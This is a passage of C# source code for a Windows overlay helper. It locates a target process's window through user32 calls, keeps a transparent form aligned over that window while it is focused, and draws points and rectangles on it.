        {
            return TryConnectProcess(Process.GetProcessesByName(processName).FirstOrDefault());
        }

        private IntPtr window;
        private RECT windowRect;
        private bool TryConnectProcess(Process? process)
        {
            this.process = null;
            if (process is null || process.HasExited) return false;

            window = FindWindow(null!, process!.MainWindowTitle);
            if (window == IntPtr.Zero) return false;

            this.process = process;
            if (!IsConnected) return false;

            AdjustOverlay();

            return true;
        }

        #endregion

        #region Adjust Overlay

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        private static extern bool GetWindowRect(IntPtr hwnd, out RECT rectangle);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();


        [StructLayout(LayoutKind.Sequential)]
        private struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }


        private void AdjustOverlay()
        {
            LocateOverlay();

            Task.Run(() =>
            {
                Thread.Sleep(adjustInterval);

                while (IsConnected)
                {
                    LocateOverlay();

                    Thread.Sleep(adjustInterval);
                }

                overlayForm.Hide();
            });
        }

        bool isOn = false;
        Graphics? graphics;
        private void LocateOverlay()
        {
            // If Focused
            var focusedWindow = GetForegroundWindow();
            if (focusedWindow != window)
            {
                if (isOn)
                {
                    isOn = false;
                    overlayForm.Hide();
                }
                return;
            }

            overlayForm.Size = new Size(windowRect.Right - windowRect.Left, windowRect.Bottom - windowRect.Top);
            overlayForm.Top = windowRect.Top;
            overlayForm.Left = windowRect.Left;

            if (!isOn)
            {
                overlayForm.Show();
            }
            isOn = true;

            graphics?.Dispose();
            graphics = null;
            graphics = overlayForm.CreateGraphics();
        }

        #endregion

        #region Dispose

        public void Dispose()
        {
            process?.Dispose();
            graphics?.Dispose();
            overlayForm.Dispose();
        }

        #endregion


        public void Reset()
        {
            graphics?.FillRectangle(Brushes.Wheat, 0, 0, overlayForm.Width, overlayForm.Height);
        }
        public void DrawPoint(Color color, Point point)
        {
            graphics?.FillEllipse(new SolidBrush(color), point.X, point.Y, 5, 5);
        }
        public void DrawRectangle(Color color, Rectangle rectangle)
        {
            graphics?.DrawRectangle(new Pen(color, 3), rectangle);
        }

    }

    #endregion
}

#endregion
